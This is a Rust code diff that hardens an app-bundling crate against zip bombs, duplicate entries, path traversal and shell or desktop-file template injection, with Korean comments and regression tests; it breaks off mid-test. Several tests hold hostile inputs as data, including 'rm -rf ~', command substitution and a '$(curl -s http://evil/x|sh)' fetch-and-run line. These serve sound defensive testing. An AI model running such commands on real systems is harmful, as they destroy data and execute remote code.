@@ -8,8 +8,8 @@ pub mod tools;
 pub use icon::{png_bytes_to_ico, png_bytes_to_square_png, png_to_ico};
 pub use manifest::{build_manifest, write_manifest, MANIFEST_FILE};
 // 빌더가 매니페스트를 만들 때 nl-update 를 따로 의존하지 않아도 되도록 다시 내보낸다.
-pub use nl_update::{Asset, AssetKind, Manifest as UpdateManifest};
 pub use inno::{app_id, find_inno_setup, render_iss, windows_installer, InnoSetup};
+pub use nl_update::{Asset, AssetKind, Manifest as UpdateManifest};
 pub use tools::{install_inno_setup_plan, run_tool_plan, ToolPlan, ToolProgress};
 
 use nl_core::bundle::{trailer, BUNDLE_TRAILER_MAGIC, MANIFEST_NAME, PROJECT_NAME, WEIGHTS_DIR};
@@ -23,6 +23,18 @@ use std::path::{Path, PathBuf};
 
 /// zip 안에서 에셋이 놓이는 디렉터리.
 pub const ASSETS_DIR: &str = "assets";
+
+/// 번들 zip 의 엔트리 개수 상한. 정상 번들은 가중치 몇 개 + 에셋 몇 십 개다.
+pub const MAX_ZIP_ENTRIES: usize = 10_000;
+/// 엔트리 하나가 선언할 수 있는 최대 해제 크기.
+pub const MAX_ENTRY_BYTES: u64 = 512 * 1024 * 1024;
+/// 번들 하나를 푸는 동안 쓸 수 있는 총 해제 바이트. zip bomb 의 상한이 된다.
+pub const MAX_BUNDLE_BYTES: u64 = 2_000_000_000;
+/// `Vec::with_capacity` 에 넘길 수 있는 최대값.
+///
+/// zip 중앙 디렉터리의 `uncompressed_size` 는 **공격자가 적는 숫자**다. 그대로 선할당하면
+/// 200 바이트짜리 파일이 `handle_alloc_error` 로 프로세스를 abort 시킨다(잡을 수 없다).
+const ALLOC_CLAMP: u64 = 8 * 1024 * 1024;
 /// 실행 파일 꼬리표 길이 (u64 길이 + 매직 6바이트).
 pub const TRAILER_LEN: u64 = 14;
 
@@ -40,7 +52,12 @@ pub struct Bundle {
 impl Bundle {
     /// 매니페스트와 프로젝트만 담은 빈 번들.
     pub fn new(manifest: BundleManifest, project: Project) -> Self {
-        Self { manifest, project, weights: BTreeMap::new(), assets: BTreeMap::new() }
+        Self {
+            manifest,
+            project,
+            weights: BTreeMap::new(),
+            assets: BTreeMap::new(),
+        }
     }
 
     /// zip 바이트로 직렬화.
@@ -65,17 +82,28 @@ impl Bundle {
         Ok(zip.finish()?.into_inner())
     }
 
+    /// zip 바이트를 읽어 번들로. **신뢰할 수 없는 입력**이라 해제량에 상한을 건다.
+    ///
+    /// 엔트리 개수([`MAX_ZIP_ENTRIES`]), 엔트리 하나의 크기([`MAX_ENTRY_BYTES`]),
+    /// 번들 전체 누적 해제량([`MAX_BUNDLE_BYTES`]) 셋을 모두 본다.
     pub fn from_zip(bytes: &[u8]) -> anyhow::Result<Self> {
         let mut zip = zip::ZipArchive::new(Cursor::new(bytes))?;
+        anyhow::ensure!(
+            zip.len() <= MAX_ZIP_ENTRIES,
+            "번들 항목이 너무 많습니다 ({} 개, 상한 {MAX_ZIP_ENTRIES} 개)",
+            zip.len()
+        );
 
-        let manifest: BundleManifest = serde_json::from_slice(&read_entry(&mut zip, MANIFEST_NAME)?)
+        let mut budget = MAX_BUNDLE_BYTES;
+        let manifest: BundleManifest = serde_json::from_slice(&read_entry(&mut zip, MANIFEST_NAME, &mut budget)?)
             .map_err(|e| anyhow::anyhow!("{MANIFEST_NAME} 을(를) 읽지 못했습니다: {e}"))?;
-        let project = ProjectFile::from_json(&String::from_utf8(read_entry(&mut zip, PROJECT_NAME)?)?)
+        let project = ProjectFile::from_json(&String::from_utf8(read_entry(&mut zip, PROJECT_NAME, &mut budget)?)?)
             .map_err(|e| anyhow::anyhow!("{PROJECT_NAME} 을(를) 읽지 못했습니다: {e}"))?
             .project;
 
         let mut weights = BTreeMap::new();
         let mut assets = BTreeMap::new();
+        let mut seen: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
         for i in 0..zip.len() {
             let mut f = zip.by_index(i)?;
             if f.is_dir() {
@@ -91,47 +119,68 @@ impl Bundle {
             if key.is_empty() {
                 continue;
             }
-            let mut buf = Vec::with_capacity(f.size() as usize);
-            f.read_to_end(&mut buf)?;
+            // 이름이 겹치면 뒤가 앞을 조용히 덮어쓴다 — 무엇이 풀릴지 알 수 없게 되므로 거절한다.
+            // 맵 키는 원문이지만 실제 파일 경로는 `safe_relative` 를 거치므로 **정규화한 뒤** 비교한다
+            // (`weights/a` 와 `weights/./a` 는 다른 키지만 같은 파일이 된다).
+            let norm = safe_relative(&key).unwrap_or_else(|| PathBuf::from(&key));
+            anyhow::ensure!(seen.insert(norm), "번들에 같은 이름의 항목이 두 번 있습니다: {name}");
+            let size = f.size();
+            let buf = read_capped(&mut f, size, &name, &mut budget)?;
             map.insert(key, buf);
         }
-        Ok(Self { manifest, project, weights, assets })
+        Ok(Self {
+            manifest,
+            project,
+            weights,
+            assets,
+        })
     }
 
     /// 가중치를 임시 폴더에 풀어 `Session::load` 가 읽을 경로를 돌려준다.
     /// 키는 `weights` 맵의 키 그대로라 `BundledModel::weights_file` 로 바로 찾을 수 있다.
     pub fn materialize_weights(&self, dir: &Path) -> anyhow::Result<std::collections::BTreeMap<String, PathBuf>> {
-        std::fs::create_dir_all(dir)?;
-        let mut out = BTreeMap::new();
-        for (name, bytes) in &self.weights {
-            let rel = safe_relative(name)
-                .ok_or_else(|| anyhow::anyhow!("가중치 이름이 폴더 밖을 가리킵니다: {name}"))?;
-            let path = dir.join(&rel);
-            if let Some(parent) = path.parent() {
-                std::fs::create_dir_all(parent)?;
-            }
-            std::fs::write(&path, bytes)?;
-            out.insert(name.clone(), path);
-        }
-        Ok(out)
+        materialize(&self.weights, dir, "가중치")
     }
 
     /// 에셋도 같은 규칙으로 풀어 놓는다 (아이콘·라벨 목록 등).
     pub fn materialize_assets(&self, dir: &Path) -> anyhow::Result<std::collections::BTreeMap<String, PathBuf>> {
-        std::fs::create_dir_all(dir)?;
-        let mut out = BTreeMap::new();
-        for (name, bytes) in &self.assets {
+        materialize(&self.assets, dir, "에셋")
+    }
+}
+
+/// 맵을 `dir` 아래에 푼다. **중간에 실패하면 그때까지 쓴 파일을 도로 지운다** —
+/// 반쯤 풀린 폴더를 남기면 다음 실행이 그것을 온전한 것으로 착각한다.
+fn materialize(
+    items: &BTreeMap<String, Vec<u8>>,
+    dir: &Path,
+    what: &str,
+) -> anyhow::Result<std::collections::BTreeMap<String, PathBuf>> {
+    std::fs::create_dir_all(dir)?;
+    let mut out: BTreeMap<String, PathBuf> = BTreeMap::new();
+    for (name, bytes) in items {
+        let result = (|| -> anyhow::Result<PathBuf> {
             let rel =
-                safe_relative(name).ok_or_else(|| anyhow::anyhow!("에셋 이름이 폴더 밖을 가리킵니다: {name}"))?;
+                safe_relative(name).ok_or_else(|| anyhow::anyhow!("{what} 이름이 폴더 밖을 가리킵니다: {name}"))?;
             let path = dir.join(&rel);
             if let Some(parent) = path.parent() {
                 std::fs::create_dir_all(parent)?;
             }
             std::fs::write(&path, bytes)?;
-            out.insert(name.clone(), path);
+            Ok(path)
+        })();
+        match result {
+            Ok(path) => {
+                out.insert(name.clone(), path);
+            }
+            Err(e) => {
+                for path in out.values() {
+                    let _ = std::fs::remove_file(path);
+                }
+                return Err(e);
+            }
         }
-        Ok(out)
     }
+    Ok(out)
 }
 
 fn file_options() -> zip::write::SimpleFileOptions {
@@ -174,10 +223,36 @@ fn safe_relative(name: &str) -> Option<PathBuf> {
     }
 }
 
-fn read_entry<R: Read + Seek>(zip: &mut zip::ZipArchive<R>, name: &str) -> anyhow::Result<Vec<u8>> {
-    let mut f = zip.by_name(name).map_err(|_| anyhow::anyhow!("번들에 {name} 이(가) 없습니다"))?;
-    let mut buf = Vec::with_capacity(f.size() as usize);
-    f.read_to_end(&mut buf)?;
+fn read_entry<R: Read + Seek>(zip: &mut zip::ZipArchive<R>, name: &str, budget: &mut u64) -> anyhow::Result<Vec<u8>> {
+    let mut f = zip
+        .by_name(name)
+        .map_err(|_| anyhow::anyhow!("번들에 {name} 이(가) 없습니다"))?;
+    let size = f.size();
+    read_capped(&mut f, size, name, budget)
+}
+
+/// 엔트리 하나를 상한 안에서 읽는다. `declared` 는 zip 이 **주장하는** 해제 크기다.
+///
+/// 세 가지를 한꺼번에 막는다. 주장값이 터무니없으면 읽기 전에 거절하고, 선할당은 클램프해서
+/// 거짓 숫자로 프로세스를 abort 시키지 못하게 하며, 실제로 읽은 길이가 주장값과 다르면 거절한다.
+fn read_capped(reader: &mut impl Read, declared: u64, name: &str, budget: &mut u64) -> anyhow::Result<Vec<u8>> {
+    anyhow::ensure!(
+        declared <= MAX_ENTRY_BYTES,
+        "번들 항목이 너무 큽니다 ({name}: {declared} 바이트, 상한 {MAX_ENTRY_BYTES} 바이트)"
+    );
+    anyhow::ensure!(
+        declared <= *budget,
+        "번들 전체 해제 크기가 상한({MAX_BUNDLE_BYTES} 바이트)을 넘었습니다: {name}"
+    );
+
+    let mut buf = Vec::with_capacity(declared.min(ALLOC_CLAMP) as usize);
+    // declared + 1 까지 읽어 "주장보다 크다" 도 잡아낸다.
+    let read = std::io::Read::take(reader, declared + 1).read_to_end(&mut buf)? as u64;
+    anyhow::ensure!(
+        read == declared,
+        "번들 항목의 크기가 목록과 다릅니다 ({name}: 목록 {declared} 바이트, 실제 {read} 바이트)"
+    );
+    *budget -= declared;
     Ok(buf)
 }
 
@@ -229,7 +304,9 @@ pub fn read_attached(exe: &Path) -> anyhow::Result<Option<Bundle>> {
     f.seek(SeekFrom::Start(total - TRAILER_LEN))?;
     let mut tail = [0u8; TRAILER_LEN as usize];
     f.read_exact(&mut tail)?;
-    let Some(range) = attached_range(total, &tail) else { return Ok(None) };
+    let Some(range) = attached_range(total, &tail) else {
+        return Ok(None);
+    };
     f.seek(SeekFrom::Start(range.start))?;
     let mut zip = vec![0u8; (range.end - range.start) as usize];
     f.read_exact(&mut zip)?;
@@ -256,14 +333,25 @@ pub fn find_runtime(target: Target) -> Option<PathBuf> {
     let file = target.runtime_file_name();
     let triple = target.triple();
     let mut candidates: Vec<PathBuf> = Vec::new();
-    if let Some(dir) = std::env::current_exe().ok().and_then(|p| p.parent().map(Path::to_path_buf)) {
+    if let Some(dir) = std::env::current_exe()
+        .ok()
+        .and_then(|p| p.parent().map(Path::to_path_buf))
+    {
         candidates.push(dir.join("runtimes").join(triple).join(file));
         candidates.push(dir.join(file));
     }
+    // 환경 변수는 어떤 실행 파일이 배포물에 들어갈지 정한다 — 상대 경로는 현재 폴더에 딸려 가므로 받지 않는다.
     if let Some(dir) = std::env::var_os("NL_RUNTIMES_DIR") {
         let dir = PathBuf::from(dir);
-        candidates.push(dir.join(triple).join(file));
-        candidates.push(dir.join(file));
+        if dir.is_absolute() {
+            candidates.push(dir.join(triple).join(file));
+            candidates.push(dir.join(file));
+        } else {
+            log::warn!(
+                "NL_RUNTIMES_DIR 는 절대 경로여야 합니다 (무시합니다): {}",
+                dir.display()
+            );
+        }
     }
     candidates.into_iter().find(|p| p.is_file())
 }
@@ -290,7 +378,14 @@ pub struct ArchiveOptions<'a> {
 
 impl<'a> ArchiveOptions<'a> {
     pub fn new(target: Target, app_exe: &'a Path, app_name: &'a str, version: &'a str, out_dir: &'a Path) -> Self {
-        Self { target, app_exe, app_name, version, out_dir, icon: None }
+        Self {
+            target,
+            app_exe,
+            app_name,
+            version,
+            out_dir,
+            icon: None,
+        }
     }
 
     pub fn icon(mut self, icon: Option<&'a Path>) -> Self {
@@ -301,13 +396,27 @@ impl<'a> ArchiveOptions<'a> {
 
 /// 배포 아카이브: Linux `tar.gz`(실행 파일 + install.sh + .desktop), Windows `zip`. 산출물 경로와 sha256 을 돌려준다.
 /// 아이콘까지 넣으려면 `archive_with` 를 쓴다.
-pub fn archive(target: Target, app_exe: &Path, app_name: &str, version: &str, out_dir: &Path) -> anyhow::Result<Artifact> {
+pub fn archive(
+    target: Target,
+    app_exe: &Path,
+    app_name: &str,
+    version: &str,
+    out_dir: &Path,
+) -> anyhow::Result<Artifact> {
     archive_with(ArchiveOptions::new(target, app_exe, app_name, version, out_dir))
 }
 
 /// 아이콘을 비롯한 추가 설정까지 받는 배포 아카이브.
 pub fn archive_with(opts: ArchiveOptions<'_>) -> anyhow::Result<Artifact> {
-    let ArchiveOptions { target, app_exe, app_name, version, out_dir, icon } = opts;
+    let ArchiveOptions {
+        target,
+        app_exe,
+        app_name,
+        version,
+        out_dir,
+        icon,
+    } = opts;
+    let version = check_version(version)?;
     let slug = slugify(app_name);
     let exe_bytes = std::fs::read(app_exe)
         .map_err(|e| anyhow::anyhow!("앱 실행 파일을 읽지 못했습니다 ({}): {e}", app_exe.display()))?;
@@ -315,8 +424,8 @@ pub fn archive_with(opts: ArchiveOptions<'_>) -> anyhow::Result<Artifact> {
     // 아이콘은 아이콘 테마가 요구하는 정사각 PNG 로 맞춰 둔다.
     let icon_png = match icon {
         Some(p) => {
-            let raw = std::fs::read(p)
-                .map_err(|e| anyhow::anyhow!("아이콘을 읽지 못했습니다 ({}): {e}", p.display()))?;
+            let raw =
+                std::fs::read(p).map_err(|e| anyhow::anyhow!("아이콘을 읽지 못했습니다 ({}): {e}", p.display()))?;
             Some(icon::png_bytes_to_square_png(&raw, icon::LINUX_ICON_SIZE)?)
         }
         None => None,
@@ -336,8 +445,43 @@ pub fn archive_with(opts: ArchiveOptions<'_>) -> anyhow::Result<Artifact> {
         }
     };
 
+    ensure_inside(out_dir, &path)?;
     let bytes = std::fs::read(&path)?;
-    Ok(Artifact { sha256: sha256_hex(&bytes), size: bytes.len() as u64, path })
+    Ok(Artifact {
+        sha256: sha256_hex(&bytes),
+        size: bytes.len() as u64,
+        path,
+    })
+}
+
+/// 산출물 이름에 들어갈 버전을 검사한다. **semver 만 받는다.**
+///
+/// `Path::join` 은 구분자를 하위 경로로 받아들이므로, 검사하지 않으면 `../../..` 이 든 버전 문자열이
+/// 산출물을 `out_dir` 밖에 떨군다. semver 는 `/`·`\`·`..` 를 애초에 허용하지 않아 이 한 줄로 닫힌다.
+pub(crate) fn check_version(version: &str) -> anyhow::Result<&str> {
+    let trimmed = version.trim();
+    semver::Version::parse(trimmed).map_err(|e| anyhow::anyhow!("버전이 semver 가 아닙니다 ({version}): {e}"))?;
+    Ok(trimmed)
+}
+
+/// `path` 가 정말 `dir` 안인지 확인한다. 경로를 만든 뒤 마지막으로 한 번 더 보는 안전망이다.
+///
+/// `dir` 은 이미 존재해야 하고 `path` 는 아직 없어도 된다 — 부모까지만 정규화해 비교한다.
+pub(crate) fn ensure_inside(dir: &Path, path: &Path) -> anyhow::Result<()> {
+    let base = dir
+        .canonicalize()
+        .map_err(|e| anyhow::anyhow!("출력 폴더를 확인하지 못했습니다 ({}): {e}", dir.display()))?;
+    let parent = path.parent().unwrap_or(Path::new("."));
+    let parent = parent
+        .canonicalize()
+        .map_err(|e| anyhow::anyhow!("출력 경로를 확인하지 못했습니다 ({}): {e}", parent.display()))?;
+    anyhow::ensure!(
+        parent.starts_with(&base),
+        "산출물이 출력 폴더 밖을 가리킵니다: {} (출력 폴더 {})",
+        path.display(),
+        base.display()
+    );
+    Ok(())
 }
 
 fn write_tar_gz(
@@ -352,9 +496,9 @@ fn write_tar_gz(
     let gz = flate2::write::GzEncoder::new(file, flate2::Compression::default());
     let mut tar = tar::Builder::new(gz);
 
-    let install = fill(INSTALL_SH, slug, app_name, version);
-    let desktop = fill(DESKTOP, slug, app_name, version);
-    let readme = fill(README_LINUX, slug, app_name, version);
+    let install = fill(INSTALL_SH, slug, app_name, version, Syntax::Shell);
+    let desktop = fill(DESKTOP, slug, app_name, version, Syntax::Desktop);
+    let readme = fill(README_LINUX, slug, app_name, version, Syntax::Text);
 
     tar_append(&mut tar, &format!("{slug}/{slug}"), exe, 0o755)?;
     tar_append(&mut tar, &format!("{slug}/install.sh"), install.as_bytes(), 0o755)?;
@@ -386,17 +530,89 @@ fn write_windows_zip(out: &Path, slug: &str, app_name: &str, version: &str, exe:
     zip.start_file(format!("{slug}.exe"), file_options().unix_permissions(0o755))?;
     zip.write_all(exe)?;
     zip.start_file("README.txt", file_options())?;
-    zip.write_all(fill(README_WINDOWS, slug, app_name, version).as_bytes())?;
+    zip.write_all(fill(README_WINDOWS, slug, app_name, version, Syntax::Text).as_bytes())?;
     zip.finish()?.sync_all()?;
     Ok(())
 }
 
-fn fill(template: &str, slug: &str, app_name: &str, version: &str) -> String {
+/// 값이 놓이는 문법. 이스케이프 방식을 정한다.
+///
+/// 같은 무이스케이프 치환을 네 가지 출력 포맷에 쓰던 것이 H8(템플릿 인젝션)의 원인이었다.
+/// 앱 이름과 버전은 프로젝트 파일에서 오는 **신뢰할 수 없는 값**이다.
+#[derive(Clone, Copy, Debug, PartialEq, Eq)]
+enum Syntax {
+    /// POSIX 셸. 값은 단일 인용 문자열 전체(따옴표 포함)로 치환된다.
+    Shell,
+    /// Desktop Entry(`.desktop`). 개행으로 새 키·그룹을 만들지 못하게 한다.
+    Desktop,
+    /// 사람이 읽는 텍스트. 제어문자만 걸러 낸다.
+    Text,
+}
+
+fn fill(template: &str, slug: &str, app_name: &str, version: &str, syntax: Syntax) -> String {
+    let (name, version) = match syntax {
+        Syntax::Shell => (
+            shell_quote(&sanitize_line(app_name)),
+            shell_quote(&sanitize_line(version)),
+        ),
+        Syntax::Desktop => (desktop_escape(app_name), desktop_escape(version)),
+        Syntax::Text => (sanitize_line(app_name), sanitize_line(version)),
+    };
     fill_tokens(
         template,
         "{{",
-        &[("{{APP_SLUG}}", slug), ("{{APP_NAME}}", app_name), ("{{APP_VERSION}}", version)],
+        &[
+            ("{{APP_SLUG}}", slug),
+            ("{{APP_NAME}}", &name),
+            ("{{APP_VERSION}}", &version),
+        ],
     )
+}
+
+/// 한 줄짜리 값으로 정리한다. 개행·제어문자를 공백으로 접고 길이를 자른다.
+///
+/// 개행 하나만으로 셸 주석을 탈출하거나 `.desktop` 에 새 키를 만들 수 있어, 어느 포맷이든 먼저 거친다.
+pub(crate) fn sanitize_line(v: &str) -> String {
+    let mut out = String::with_capacity(v.len());
+    for ch in v.chars() {
+        if ch.is_control() {
+            if !out.ends_with(' ') {
+                out.push(' ');
+            }
+        } else {
+            out.push(ch);
+        }
+    }
+    let out = out.trim().to_string();
+    // 템플릿 한 줄을 화면 밖으로 밀어내는 값도 막는다.
+    out.chars().take(MAX_NAME_CHARS).collect()
+}
+
+/// 이름·버전 문자열의 최대 길이(문자 수).
+pub(crate) const MAX_NAME_CHARS: usize = 200;
+
+/// POSIX 셸 단일 인용. `'` 는 `'\''` 로 끊어 붙인다 — 안에서는 `$`·백틱·`"` 모두 글자다.
+pub(crate) fn shell_quote(s: &str) -> String {
+    format!("'{}'", s.replace('\'', "'\\''"))
+}
+
+/// Desktop Entry 값 이스케이프. 개행·탭·역슬래시를 명세의 두 글자 표기로 바꾼다.
+///
+/// 이렇게 해야 `Name=앱\nActions=pwn` 같은 값이 새 키나 새 그룹이 되지 못한다.
+pub(crate) fn desktop_escape(v: &str) -> String {
+    let mut out = String::with_capacity(v.len() + 8);
+    for ch in v.chars() {
+        match ch {
+            '\\' => out.push_str(r"\\"),
+            '\n' => out.push_str(r"\n"),
+            '\r' => out.push_str(r"\r"),
+            '\t' => out.push_str(r"\t"),
+            // 남은 제어문자는 자리만 차지하지 않게 공백으로.
+            c if c.is_control() => out.push(' '),
+            c => out.push(c),
+        }
+    }
+    out.trim().chars().take(MAX_NAME_CHARS).collect()
 }
 
 /// 템플릿을 한 번만 훑어 치환한다. 값 안에 다른 자리표시자 문자열이 들어 있어도 다시 치환되지 않는다.
@@ -501,11 +717,18 @@ mod tests {
         let mut manifest = BundleManifest::new("내 앱", "1.2.3");
         manifest.built_with = "nl-app 테스트".into();
         manifest.models = vec![
-            BundledModel { model: m1, weights_file: "classifier.safetensors".into() },
-            BundledModel { model: m2, weights_file: "regressor.safetensors".into() },
+            BundledModel {
+                model: m1,
+                weights_file: "classifier.safetensors".into(),
+            },
+            BundledModel {
+                model: m2,
+                weights_file: "regressor.safetensors".into(),
+            },
         ];
         let mut b = Bundle::new(manifest, project);
-        b.weights.insert("classifier.safetensors".into(), vec![1, 2, 3, 4, 5, 0, 255]);
+        b.weights
+            .insert("classifier.safetensors".into(), vec![1, 2, 3, 4, 5, 0, 255]);
         b.weights.insert("regressor.safetensors".into(), (0u8..64).collect());
         b.assets.insert("labels.txt".into(), "고양이\n개\n".as_bytes().to_vec());
         b.assets.insert("icons/app.png".into(), vec![0x89, b'P', b'N', b'G']);
@@ -535,14 +758,21 @@ mod tests {
             assert_eq!(&std::fs::read(path).unwrap(), &b.weights[name]);
         }
         let assets = b.materialize_assets(dir.path()).unwrap();
-        assert_eq!(std::fs::read(&assets["icons/app.png"]).unwrap(), b.assets["icons/app.png"]);
+        assert_eq!(
+            std::fs::read(&assets["icons/app.png"]).unwrap(),
+            b.assets["icons/app.png"]
+        );
     }
 
     #[test]
     fn attach_round_trips() {
         let dir = tempfile::tempdir().unwrap();
         let fake_exe = dir.path().join("nl-runtime");
-        let exe_bytes: Vec<u8> = b"\x7fELF fake runtime binary bytes".iter().copied().chain(0u8..200).collect();
+        let exe_bytes: Vec<u8> = b"\x7fELF fake runtime binary bytes"
+            .iter()
+            .copied()
+            .chain(0u8..200)
+            .collect();
         std::fs::write(&fake_exe, &exe_bytes).unwrap();
 
         let b = sample();
@@ -624,7 +854,10 @@ mod tests {
             assert!(names.iter().any(|n| n == want), "{want} 가 없습니다: {names:?}");
         }
         assert!(install.contains("내 앱"), "install.sh 에 앱 이름이 없습니다");
-        assert!(!install.contains("{{APP_SLUG}}"), "치환되지 않은 자리표시자가 남았습니다");
+        assert!(
+            !install.contains("{{APP_SLUG}}"),
+            "치환되지 않은 자리표시자가 남았습니다"
+        );
     }
 
     #[test]
@@ -653,10 +886,9 @@ mod tests {
         let icon = dir.path().join("icon.png");
         std::fs::write(&icon, icon::sample_png(300, 300)).unwrap();
 
-        let art = archive_with(
-            ArchiveOptions::new(Target::LinuxX64, &exe, "내 앱", "1.2.3", dir.path()).icon(Some(&icon)),
-        )
-        .unwrap();
+        let art =
+            archive_with(ArchiveOptions::new(Target::LinuxX64, &exe, "내 앱", "1.2.3", dir.path()).icon(Some(&icon)))
+                .unwrap();
 
         let gz = flate2::read::GzDecoder::new(File::open(&art.path).unwrap());
         let mut tar = tar::Archive::new(gz);
@@ -677,8 +909,14 @@ mod tests {
         assert!(names.iter().any(|n| n == "app/app.png"), "{names:?}");
         // 아이콘 테마가 요구하는 256×256 정사각으로 맞춰 들어간다.
         let img = image::load_from_memory_with_format(&png, image::ImageFormat::Png).unwrap();
-        assert_eq!((img.width(), img.height()), (icon::LINUX_ICON_SIZE, icon::LINUX_ICON_SIZE));
-        assert!(install.contains("hicolor/256x256/apps"), "install.sh 가 아이콘을 설치하지 않습니다");
+        assert_eq!(
+            (img.width(), img.height()),
+            (icon::LINUX_ICON_SIZE, icon::LINUX_ICON_SIZE)
+        );
+        assert!(
+            install.contains("hicolor/256x256/apps"),
+            "install.sh 가 아이콘을 설치하지 않습니다"
+        );
         assert!(install.contains("app.png"));
     }
 
@@ -691,8 +929,11 @@ mod tests {
 
         let gz = flate2::read::GzDecoder::new(File::open(&art.path).unwrap());
         let mut tar = tar::Archive::new(gz);
-        let names: Vec<String> =
-            tar.entries().unwrap().map(|e| e.unwrap().path().unwrap().to_string_lossy().to_string()).collect();
+        let names: Vec<String> = tar
+            .entries()
+            .unwrap()
+            .map(|e| e.unwrap().path().unwrap().to_string_lossy().to_string())
+            .collect();
         assert!(!names.iter().any(|n| n.ends_with(".png")), "{names:?}");
         assert_eq!(names.len(), 4);
     }
@@ -700,8 +941,228 @@ mod tests {
     #[test]
     fn fill_does_not_substitute_inside_substituted_values() {
         // 앱 이름이 다른 자리표시자처럼 생겨도 한 번만 치환된다.
-        let out = fill("이름={{APP_NAME}} 버전={{APP_VERSION}}", "slug", "{{APP_VERSION}}", "9.9");
+        let out = fill(
+            "이름={{APP_NAME}} 버전={{APP_VERSION}}",
+            "slug",
+            "{{APP_VERSION}}",
+            "9.9",
+            Syntax::Text,
+        );
         assert_eq!(out, "이름={{APP_VERSION}} 버전=9.9");
+    }
+
+    // ── H7: zip bomb ──
+
+    #[test]
+    fn an_entry_that_claims_a_huge_size_is_refused_before_reading() {
+        let mut budget = MAX_BUNDLE_BYTES;
+        let err = read_capped(&mut "짧다".as_bytes(), MAX_ENTRY_BYTES + 1, "w", &mut budget)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("너무 큽니다"), "{err}");
+        assert_eq!(budget, MAX_BUNDLE_BYTES, "읽지 않았으므로 예산도 그대로");
+    }
+
+    #[test]
+    fn the_total_budget_runs_out_across_entries() {
+        let data = vec![0u8; 1000];
+        let mut budget = 2500;
+        read_capped(&mut &data[..], 1000, "a", &mut budget).unwrap();
+        assert_eq!(budget, 1500);
+        read_capped(&mut &data[..], 1000, "b", &mut budget).unwrap();
+        assert_eq!(budget, 500);
+        let err = read_capped(&mut &data[..], 1000, "c", &mut budget)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("전체 해제 크기"), "{err}");
+    }
+
+    /// 중앙 디렉터리의 숫자가 실제와 다르면 거절한다 — 위조한 `uncompressed_size` 를 잡는 자리다.
+    #[test]
+    fn a_declared_size_that_does_not_match_the_content_is_refused() {
+        let mut budget = MAX_BUNDLE_BYTES;
+        // 주장보다 적게 들어 있다.
+        let err = read_capped(&mut &b"abc"[..], 100, "a", &mut budget)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("크기가 목록과 다릅니다"), "{err}");
+        // 주장보다 많이 들어 있다.
+        let err = read_capped(&mut &b"abcdef"[..], 3, "a", &mut budget)
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("크기가 목록과 다릅니다"), "{err}");
+        // 맞으면 통과.
+        assert_eq!(read_capped(&mut &b"abc"[..], 3, "a", &mut budget).unwrap(), b"abc");
+    }
+
+    #[test]
+    fn too_many_entries_are_refused() {
+        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::<u8>::new()));
+        let opts = file_options().compression_method(zip::CompressionMethod::Stored);
+        for i in 0..=MAX_ZIP_ENTRIES {
+            zip.start_file(format!("assets/{i}"), opts).unwrap();
+            zip.write_all(b"x").unwrap();
+        }
+        let bytes = zip.finish().unwrap().into_inner();
+
+        let err = Bundle::from_zip(&bytes).unwrap_err().to_string();
+        assert!(err.contains("항목이 너무 많습니다"), "{err}");
+    }
+
+    /// L19: 정규화하면 같은 파일이 되는 두 항목이 조용히 덮어쓰지 못한다.
+    #[test]
+    fn duplicate_entry_names_are_refused() {
+        let bundle = sample();
+        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::<u8>::new()));
+        let opts = file_options();
+        zip.start_file(MANIFEST_NAME, opts).unwrap();
+        zip.write_all(serde_json::to_string(&bundle.manifest).unwrap().as_bytes())
+            .unwrap();
+        zip.start_file(PROJECT_NAME, opts).unwrap();
+        zip.write_all(ProjectFile::new(bundle.project.clone()).to_json().as_bytes())
+            .unwrap();
+        zip.start_file("weights/a.bin", opts).unwrap();
+        zip.write_all(b"first").unwrap();
+        zip.start_file("weights/./a.bin", opts).unwrap();
+        zip.write_all(b"second").unwrap();
+        let bytes = zip.finish().unwrap().into_inner();
+
+        let err = Bundle::from_zip(&bytes).unwrap_err().to_string();
+        assert!(err.contains("두 번 있습니다"), "{err}");
+    }
+
+    /// L20: 중간에 실패하면 그때까지 쓴 파일이 남지 않는다.
+    #[test]
+    fn a_failed_materialize_leaves_nothing_behind() {
+        let dir = tempfile::tempdir().unwrap();
+        let mut weights = BTreeMap::new();
+        weights.insert("ok.bin".to_string(), b"a".to_vec());
+        // BTreeMap 이라 "ok.bin" 다음에 온다 — 앞의 파일이 이미 쓰인 뒤 실패한다.
+        weights.insert("zz/../../탈출.bin".to_string(), b"b".to_vec());
+
+        let err = materialize(&weights, dir.path(), "가중치").unwrap_err().to_string();
+        assert!(err.contains("폴더 밖"), "{err}");
+        let left: Vec<String> = std::fs::read_dir(dir.path())
+            .unwrap()
+            .map(|e| e.unwrap().file_name().to_string_lossy().into())
+            .collect();
+        assert!(left.is_empty(), "반쯤 풀린 파일이 남았습니다: {left:?}");
+    }
+
+    /// H8: 악의적인 앱 이름이 셸·Desktop·텍스트 어디서도 문법을 깨지 못한다.
+    const EVIL_NAME: &str = r#"a"; rm -rf ~; echo ""#;
+
+    #[test]
+    fn a_malicious_name_cannot_break_out_of_the_install_script() {
+        let out = fill(INSTALL_SH, "app", EVIL_NAME, "0.1.0", Syntax::Shell);
+        // 이름은 단일 인용 문자열 하나로만 들어간다.
+        assert!(out.contains(r#"APP_NAME='a"; rm -rf ~; echo "'"#), "{out}");
+
+        // 명령 치환·백틱이 인용 밖으로 새지 않는다.
+        for evil in ["$(id)", "`id`", "$(curl -s http://evil/x|sh)"] {
+            let out = fill(INSTALL_SH, "app", evil, "0.1.0", Syntax::Shell);
+            assert!(out.contains(&format!("APP_NAME='{evil}'")), "{out}");
+        }
+
+        // 단일 인용부호가 든 이름도 인용을 깨지 못한다.
+        let out = fill(INSTALL_SH, "app", "a'; id; echo '", "0.1.0", Syntax::Shell);
+        assert!(out.contains(r"APP_NAME='a'\''; id; echo '\'''"), "{out}");
+
+        // 개행으로 주석이나 대입을 탈출하지 못한다.
+        let out = fill(INSTALL_SH, "app", "앱\nrm -rf ~", "0.1.0", Syntax::Shell);
+        assert_eq!(out.lines().filter(|l| l.starts_with("APP_NAME=")).count(), 1, "{out}");
+        assert!(!out.lines().any(|l| l.trim() == "rm -rf ~"), "{out}");
+    }
+
+    #[test]
+    fn the_generated_install_script_is_valid_bash() {
+        let dir = tempfile::tempdir().unwrap();
